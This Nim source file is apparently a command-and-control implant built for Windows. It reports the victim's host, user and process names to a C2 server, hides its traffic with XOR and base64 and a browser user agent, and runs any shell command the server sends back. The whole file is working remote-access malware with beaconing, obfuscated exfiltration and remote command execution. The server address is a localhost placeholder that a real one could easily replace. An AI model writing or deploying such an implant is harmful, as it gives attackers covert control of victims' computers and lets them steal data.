# compile with : nim c --os:windows --cpu:amd64 --cc=gcc --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc --passL:-static -d:release agent.nim
import os, osproc, strutils, json, httpclient, base64, times

const c2Url = "http://127.0.0.1:8080/api" 
const xorKey* = "mysecretkey" 
const useragent = "Mozilla/5.0"

# XOR encrypt/decrypt
proc xorStr(data, key: string): string =
  result = ""
  let keyLen = key.len
  for i, c in data:
    result.add(chr(ord(c) xor ord(key[i mod keyLen])))

proc xorEncode(str: string): string =
  result = base64.encode(xorStr(str, xorKey))

proc xorDecode(str: string): string =
  result = xorStr(base64.decode(str), xorKey)

# Agent id helpers
proc getHostName*: string =
  when defined(windows):
    result = getEnv("COMPUTERNAME")
  else:
    result = getEnv("HOSTNAME")

proc getUserName*: string =
  when defined(windows):
    result = getEnv("USERNAME")
  else:
    result = getEnv("USER")

proc getProcessName*: string =
  result = getAppFilename().splitPath.tail

proc generateAgentId*: string =
  getHostName() & "_" & getUserName() & "_" & getProcessName()

# Command execution
proc execCommand*(cmd: string): string =
  try:
    let output = execProcess(cmd, options = {poUsePath, poStdErrToStdOut})
    return base64.encode(output)
  except Exception as e:
    return "Error: " & e.msg

# Post to C2 and get task
proc pollC2*(url: string, agentId: string, host, user, procName, results: string): JsonNode =
  let payload = %*{
    "agent_id": agentId,
    "hostname": host,
    "username": user,
    "process_name": procName,
    "results": results
  }
  let encPayload = xorEncode($payload)
  var client = newHttpClient()
  try:
    let resp = client.request(
      url,
      httpMethod = HttpPost,
      body = encPayload,
      headers = newHttpHeaders({
        "User-Agent": useragent,
        "Accept": "application/json"
      })
    )
    if resp.code == Http200:
      var taskB64 = ""
      try:
        taskB64 = parseJson(resp.body).getStr()
      except CatchableError:
        taskB64 = ""
      if taskB64.len > 0:
        let respDecoded = xorDecode(taskB64)
        return parseJson(respDecoded)
      else:
        return %*{ "task": { "type": "", "content": "" } }
    else:
      raise newException(IOError, "Server returned " & $resp.code)
  except Exception as e:
    echo "[X] Comms error: ", e.msg
    return %*{ "task": { "type": "", "content": "" } }

proc main() =
  let agentId = generateAgentId()
  let host = getHostName()
  let user = getUserName()
  let processName = getProcessName()
  var results = ""
  while true:
      let j = pollC2(c2Url, agentId, host, user, processName, results)
      let taskNode = j["task"]
      var taskType = ""
      var content = ""
      if taskNode.kind == JString:
        let taskStr = taskNode.getStr()
        var cidx = taskStr.find("'cmd':")
        if cidx >= 0:
          let after = taskStr.substr(cidx+6)
          let quoteIdx = after.find("'")
          if quoteIdx >= 0:
            content = after.substr(quoteIdx+1).split("'")[0]
            taskType = "cmd"
      elif taskNode.kind == JObject:
        taskType = taskNode{"type"}.getStr()
        content = taskNode{"content"}.getStr()

      results = ""
      if taskType == "cmd" and content.len > 0:
        results = execCommand(content)
      else:
        sleep(5000)


main()
